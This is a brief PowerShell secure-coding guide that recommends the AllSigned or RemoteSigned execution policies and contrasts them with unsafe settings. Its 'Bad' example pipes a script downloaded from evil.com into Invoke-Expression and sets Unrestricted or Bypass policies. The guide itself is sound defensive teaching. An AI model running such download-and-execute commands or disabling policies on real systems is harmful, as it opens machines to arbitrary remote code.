# sec-execution-policy

> Use AllSigned or RemoteSigned in production

## Why It Matters

Execution policies are PowerShell's first line of defense against untrusted scripts. `AllSigned` requires all scripts to be digitally signed by a trusted publisher. `RemoteSigned` allows local scripts to run unsigned but requires downloaded scripts to be signed. `Unrestricted` or `Bypass` leave systems vulnerable to script-based attacks.

## Bad

```powershell
# Unrestricted — runs any script from anywhere
Set-ExecutionPolicy Unrestricted -Scope LocalMachine -Force

# Bypass — no checks at all
Set-ExecutionPolicy Bypass -Scope Process -Force

# Running downloaded scripts without checking signature
Invoke-WebRequest https://evil.com/script.ps1 | Invoke-Expression
```

## Good

```powershell
# Production — strictest safe policy
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# Development — allow local, require signature for downloads
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# Check script signature before running
$script = Get-ChildItem ./deploy.ps1
$signature = Get-AuthenticodeSignature $script
if ($signature.Status -ne 'Valid') {
    throw "Script $($script.Name) is not signed or signature is invalid"
}
./deploy.ps1
```

## Recommended Per-Scope Policy

```powershell
# LocalMachine — AllSigned (protect all users)
Set-ExecutionPolicy AllSigned -Scope LocalMachine

# CurrentUser — RemoteSigned (dev flexibility)
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser

# Process — Restrict when running specific tasks
powershell.exe -ExecutionPolicy Restricted -File sensitive.ps1

# Validate current policy
Get-ExecutionPolicy -List | Format-Table Scope, ExecutionPolicy
```

## See Also

- [sec-script-signing](sec-script-signing.md) - Sign production scripts
- [sec-avoid-iex](sec-avoid-iex.md) - Avoid Invoke-Expression
